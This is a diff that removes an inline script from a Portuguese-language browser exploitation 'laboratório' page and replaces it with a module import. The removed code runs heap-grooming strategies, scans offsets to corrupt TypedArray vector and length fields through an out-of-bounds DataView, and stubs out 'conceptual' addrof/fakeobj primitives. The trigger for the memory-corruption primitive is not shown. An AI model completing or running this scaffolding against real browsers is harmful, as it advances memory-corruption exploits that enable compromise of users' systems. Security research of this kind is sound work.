-                if (!HeapGroomerLib.victim_object || HeapGroomerLib.victim_object_type !== 'TypedArray') { log("ERRO: Vítima.", "error", FNAME); return; }
-                if (!CoreExploitLib.oob_dataview_real) { log("ERRO: Primitiva OOB.", "error", FNAME); return; }
-                const gapStart = parseInt(document.getElementById('gapStartScan').value); const gapEnd = parseInt(document.getElementById('gapEndScan').value); const gapStep = parseInt(document.getElementById('gapStepScan').value);
-                if (isNaN(gapStart) || isNaN(gapEnd) || isNaN(gapStep) || gapStep === 0) { log("ERRO: Faixa de GAP inválida.", "error", FNAME); return; }
-                log(`   Iniciando busca de GAP de ${gapStart} a ${gapEnd}, passo ${gapStep}.`, "info", FNAME); await PAUSE_LAB(1000);
-                let best_gap_info_no_crash = null;
-                for (let current_gap = gapStart; current_gap <= gapEnd; current_gap += gapStep) {
-                    if (this.last_successful_gap !== null) { log(`GAP de sucesso (${this.last_successful_gap}) já encontrado. Interrompendo.`, "good", FNAME); break; }
-                    log(`Testando GAP: ${current_gap}`, "test", FNAME); this.CURRENT_TEST_GAP = current_gap;
-                    const result = await this.try_corrupt_fields_for_gap(current_gap);
-                    if (result.crashed_or_error) { log(`CORRUPÇÃO BEM SUCEDIDA (CRASH/ERRO) com GAP = ${this.last_successful_gap}!`, "critical", FNAME); break; }
-                    else if (result.mvector_corrupted || result.mlength_corrupted) { if (!best_gap_info_no_crash) best_gap_info_no_crash = result; log(`   GAP ${current_gap}: Campos CORROMPIDOS SEM CRASH.`, "good", FNAME); }
-                    else if (result.mvector_read !== "N/A" && !result.mvector_read.toLowerCase().includes("aaaa")) { if (!best_gap_info_no_crash) best_gap_info_no_crash = result; log(`   GAP ${current_gap}: m_vector válido LIDO.`, "info", FNAME); }
-                    await PAUSE_LAB(300); if (document.hidden) { log("Busca abortada.", "warn", FNAME); break; }
-                    if (current_gap < gapEnd && (current_gap + gapStep) > gapEnd && (current_gap + gapStep) !== gapEnd ) { current_gap = gapEnd - gapStep; }
-                }
-                if (this.last_successful_gap !== null) { log(`Busca concluída. GAP PROMISSOR: ${this.last_successful_gap}`, "vuln", FNAME); }
-                else if (best_gap_info_no_crash) { log("Busca concluída. Nenhum crash. Melhor candidato (sem crash): GAP " + best_gap_info_no_crash.gap, "warn", FNAME); }
-                else { log("Busca concluída. Nenhuma corrupção confirmada.", "error", FNAME); }
-                log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
-            }
-        };
-
-
-        // ===================================================================================
-        // MÓDULO: PostExploitLib_Conceptual
-        // ===================================================================================
-        const PostExploitLib_Conceptual = { /* ... implementação como na v2.7.1 ... */
-            arr_leaker: null,
-            arr_marker: { p0:0x41414141, p1:0x42424242, p2:0x43434343, p3:0x44444444 }, // Objeto JS simples
-            addr_arr_marker_approx: null,
-            FNAME_BASE: "PostExploitLib_Conceptual",
-
-            setup_addrof_fakeobj_pair_conceptual: async function() {
-                log(`--- Iniciando ${this.FNAME_BASE}.setup ---`, 'test', this.FNAME_BASE);
-                const gap_to_use_str = document.getElementById('addrofGap').value; let gap_to_use = parseInt(gap_to_use_str);
-                if (isNaN(gap_to_use) && VictimCorruptorLib.last_successful_gap !== null) { gap_to_use = VictimCorruptorLib.last_successful_gap; document.getElementById('addrofGap').value = gap_to_use; log(`Usando último GAP de sucesso: ${gap_to_use}`, "info", this.FNAME_BASE); }
-                else if (isNaN(gap_to_use)) { log("ERRO: GAP para addrof inválido.", "error", this.FNAME_BASE); return; }
-                if (!CoreExploitLib.oob_dataview_real) { log("ERRO: Primitiva OOB não ativa.", "error", this.FNAME_BASE); return; }
-                this.arr_leaker = new Uint32Array(16); // Usado para *tentar* ler/escrever
-                // this.arr_marker já é um objeto JS.
-                log("`arr_leaker` e `arr_marker` (objeto JS) criados.", "info", this.FNAME_BASE);
-                log("Este é um teste altamente conceitual e provavelmente não funcionará como um addrof/fakeobj real sem primitivas mais fortes.", "warn", this.FNAME_BASE);
-                log(`--- ${this.FNAME_BASE}.setup Concluído ---`, 'test', this.FNAME_BASE);
-            },
-            addrof_conceptual: function(obj_to_leak) { log("addrof_conceptual: Placeholder.", "warn", this.FNAME_BASE); if (obj_to_leak === this.arr_marker && this.addr_arr_marker_approx) return this.addr_arr_marker_approx; return new Int64Lib.AdvancedInt64("0xDEADBEEFDEADBEEF"); },
-            fakeobj_conceptual: function(address_of_fake_struct) { log("fakeobj_conceptual: Placeholder.", "warn", this.FNAME_BASE); if (address_of_fake_struct instanceof Int64Lib.AdvancedInt64) {log(`   Tentaria criar um objeto no endereço: ${address_of_fake_struct.toString(true)}`, "info", this.FNAME_BASE);} return { fake: true, address: address_of_fake_struct }; },
-            test_addrof_conceptual: async function() {
-                log(`--- Iniciando ${this.FNAME_BASE}.test_addrof ---`, 'test', this.FNAME_BASE);
-                const obj_name_to_leak = document.getElementById('objNameToLeak').value; let obj_instance;
-                try { obj_instance = eval(obj_name_to_leak); } catch (e) { log(`ERRO: Objeto global '${obj_name_to_leak}' não encontrado. Ex: 'PostExploitLib_Conceptual.arr_marker'`, "error", this.FNAME_BASE); return; }
-                if (typeof obj_instance === 'undefined') { log(`ERRO: Objeto '${obj_name_to_leak}' é undefined.`, "error", this.FNAME_BASE); return; }
-                log(`Tentando obter endereço de '${obj_name_to_leak}'`, "info", this.FNAME_BASE);
-                const addr = this.addrof_conceptual(obj_instance); log(`Endereço (conceitual) de '${obj_name_to_leak}': ${addr.toString(true)}`, "leak", this.FNAME_BASE);
-                if (obj_instance === this.arr_marker) this.addr_arr_marker_approx = addr;
-                log(`--- ${this.FNAME_BASE}.test_addrof Concluído ---`, 'test', this.FNAME_BASE);
-            },
-            test_fakeobj_conceptual: async function() {
-                log(`--- Iniciando ${this.FNAME_BASE}.test_fakeobj ---`, 'test', this.FNAME_BASE);
-                const addr_hex = document.getElementById('fakeObjAddrHex').value; let fake_addr_int;
-                try { fake_addr_int = new Int64Lib.AdvancedInt64(addr_hex); } catch (e) { log(`ERRO: Endereço hexadecimal inválido: ${addr_hex}`, "error", this.FNAME_BASE); return; }
-                log(`Tentando criar objeto falso em: ${fake_addr_int.toString(true)}`, "info", this.FNAME_BASE);
-                const f_obj = this.fakeobj_conceptual(fake_addr_int); log(`Objeto falso (conceitual): ${JSON.stringify(f_obj)}`, "leak", this.FNAME_BASE);
-                log(`--- ${this.FNAME_BASE}.test_fakeobj Concluído ---`, 'test', this.FNAME_BASE);
-            }
-        };
-
-        // ===================================================================================
-        // MÓDULO: App (Lógica de UI e Fluxos Principais)
-        // ===================================================================================
-        const App = {
-            runAllGroomingStrategies: async () => {
-                const FNAME_STRAT = "App.runAllGroomingStrategies";
-                log(`--- Iniciando ${FNAME_STRAT} ---`, 'test', FNAME_STRAT);
-                CoreExploitLib.updateGlobalConfigs();
-                const spray_count = parseInt(document.getElementById('sprayCountBase').value) || 500;
-                const intermediate_allocs = parseInt(document.getElementById('intermediateAllocs').value) || 100;
-                const strategies = [
-                    { victim_first: true, oob_first: false, spray_adj: 0, inter_adj: 0, name: "Vítima primeiro, OOB depois (Padrão)"},
-                    { victim_first: false, oob_first: true, spray_adj: 0, inter_adj: 0, name: "OOB primeiro, Vítima depois"},
-                    { victim_first: true, oob_first: false, spray_adj: 200, inter_adj: 50, name: "Vítima primeiro, Spray Maior"},
-                    { victim_first: false, oob_first: true, spray_adj: -100, inter_adj: -20, name: "OOB primeiro, Spray Menor"},
-                ];
-                VictimCorruptorLib.last_successful_gap = null; // Resetar antes de novas estratégias
-
-                for (const strat of strategies) {
-                    if (VictimCorruptorLib.last_successful_gap !== null) { log("GAP de sucesso já encontrado. Interrompendo.", "good", FNAME_STRAT); break; }
-                    log(`*** Iniciando Estratégia: ${strat.name} ***`, "critical", FNAME_STRAT);
-                    if (strat.oob_first) {
-                        await CoreExploitLib.triggerOOB_primitive();
-                        if (!CoreExploitLib.oob_dataview_real) { log("Falha OOB, pulando.", "error", FNAME_STRAT); continue; }
-                        await HeapGroomerLib.groomHeapForSameSize(spray_count + strat.spray_adj, CoreExploitLib.OOB_ALLOCATION_SIZE, intermediate_allocs + strat.inter_adj, false);
-                        if (!await HeapGroomerLib.prepareVictim(CoreExploitLib.OOB_ALLOCATION_SIZE)) continue;
-                    } else {
-                        await HeapGroomerLib.groomHeapForSameSize(spray_count + strat.spray_adj, CoreExploitLib.OOB_ALLOCATION_SIZE, intermediate_allocs + strat.inter_adj, true);
-                        if (!await HeapGroomerLib.prepareVictim(CoreExploitLib.OOB_ALLOCATION_SIZE)) continue;
-                        await CoreExploitLib.triggerOOB_primitive();
-                        if (!CoreExploitLib.oob_dataview_real) { log("Falha OOB, pulando.", "error", FNAME_STRAT); continue; }
-                    }
-                    await VictimCorruptorLib.findAndCorruptVictimFields_Iterative();
-                    await PAUSE_LAB(2000);
-                }
-                log(`--- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
-                if (VictimCorruptorLib.last_successful_gap === null) { log("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT); }
-                 else { if (document.getElementById('addrofGap')) document.getElementById('addrofGap').value = VictimCorruptorLib.last_successful_gap; }
-            },
-
-            updateCurrentTestGapFromScanUIAndTestSingle: () => {
-                const gapVal = parseInt(document.getElementById('gapStartScan').value);
-                if (!isNaN(gapVal)) {
-                    VictimCorruptorLib.CURRENT_TEST_GAP = gapVal;
-                    log(`CURRENT_TEST_GAP (teste único) atualizado para: ${VictimCorruptorLib.CURRENT_TEST_GAP} bytes.`, 'tool', 'App.Config');
-                    VictimCorruptorLib.try_corrupt_fields_for_gap(VictimCorruptorLib.CURRENT_TEST_GAP);
-                } else { log("Valor de GAP inválido.", "error", "App.Config"); }
-            }
-        };
-
-        // ===================================================================================
-        // Inicialização da Aplicação e Testes de Módulos
-        // ===================================================================================
-        document.addEventListener('DOMContentLoaded', () => {
-            CoreExploitLib.updateGlobalConfigs(); // Carrega configs iniciais dos inputs
-            log("Laboratório (v2.7.2 - Correção Teste Modularidade) pronto para testes.", "good", "App.Init");
-
-            const testButtonsContainer = document.createElement('div');
-            testButtonsContainer.className = 'container';
-            testButtonsContainer.innerHTML = `
-                <h3>Testes de Módulos Individuais</h3>
-                <button onclick="Int64Lib.testModule()">Testar Módulo Int64Lib</button>
-                <button onclick="UtilsLib.testModule()">Testar Módulo UtilsLib</button>
-                <button onclick="CoreExploitLib.testModule()">Testar Módulo CoreExploitLib (OOB)</button>
-                <p class="notes">Módulos HeapGroomerLib e VictimCorruptorLib são testados através dos fluxos principais (Passos 1-2). PostExploitLib é conceitual.</p>
-            `;
-            const logOutputDiv = document.getElementById('logOutput');
-            logOutputDiv.parentNode.insertBefore(testButtonsContainer, logOutputDiv.nextSibling);
-
-            // Preencher campo GAP para addrof se um GAP de sucesso já foi encontrado
-            if (document.getElementById('addrofGap') && VictimCorruptorLib.last_successful_gap !== null) {
-                 document.getElementById('addrofGap').value = VictimCorruptorLib.last_successful_gap;
-            }
-        });
-
-        log("Script principal carregado e pronto.", "info", "Global");
-
-    </script>
+    <script type="module" src="js/app.mjs"></script>
 </body>
 </html>
